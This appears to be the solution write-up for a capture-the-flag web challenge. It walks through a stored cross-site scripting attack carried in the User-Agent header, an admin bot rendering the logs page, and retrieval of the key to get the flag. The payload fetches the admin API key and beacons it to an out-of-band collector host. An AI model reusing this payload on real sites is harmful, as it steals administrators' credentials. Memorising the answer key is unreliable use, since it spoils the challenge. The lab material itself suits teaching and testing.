Full chain:

```
GET /
User-Agent: <img src=x onerror="fetch('/admin/apikey').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?k='+encodeURIComponent(t)})">
```

That single request stores the payload in the visitor log. Wait a couple of
seconds for the admin bot to load `/admin/logs` — it renders your User-Agent
unescaped, the `onerror` fires in the admin's session, fetches the admin-only API
key, and beacons it out. Then read what the collector captured through the app's
proxy:

```
GET /oob/received
```

You will see an item with a path like `/report?k=<32 hex>`. That hex value is the
admin API key. Submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{…}`. (`/solve` accepts either the bare 32-hex value or a full
`session=<value>` string.) `tests/exploit.py` runs the whole flow and also checks
that `/admin/logs` and `/admin/apikey` are `403` for you — proving you never load
the page you are attacking.
